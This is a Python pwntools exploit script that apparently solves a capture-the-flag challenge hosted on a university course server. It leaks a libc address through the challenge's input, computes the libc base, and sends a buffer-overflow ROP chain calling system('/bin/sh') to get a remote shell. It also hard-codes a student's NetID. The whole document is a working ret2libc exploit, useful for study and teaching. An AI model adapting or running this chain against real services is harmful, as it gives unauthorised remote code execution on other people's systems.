from pwn import *

context.arch = "amd64"
#context.log_level = "DEBUG"
libc = ELF("./libc.so.6", checksec=False)
target = ELF("./ez_target", checksec=False)

rop = ROP(libc)
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols.system

conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1203)
conn.recvuntil(b'Please input your NetID (something like abc123): ')
conn.sendline(b'vc2499')

conn.recvuntil(b'like to ask me?\n')
conn.send(p64(target.symbols.stdin))
leaked_libc = int(conn.recvline().strip(), 16)
libc_base = leaked_libc - libc.symbols._IO_2_1_stdin_
assert libc_base & 0xfff == 0, "Error: Misaligned libc base address!"

payload = (
    b'A' * 0x18 +
    p64(rop.rdi.address + libc_base) +  # Address of "/bin/sh" in RDI
    p64(bin_sh + libc_base) +
    p64(rop.ret.address + libc_base) +  # Stack alignment
    p64(system + libc_base)             # Call system("/bin/sh")
)

conn.recvuntil(b'shell!\n')
conn.sendline(payload)
conn.interactive()

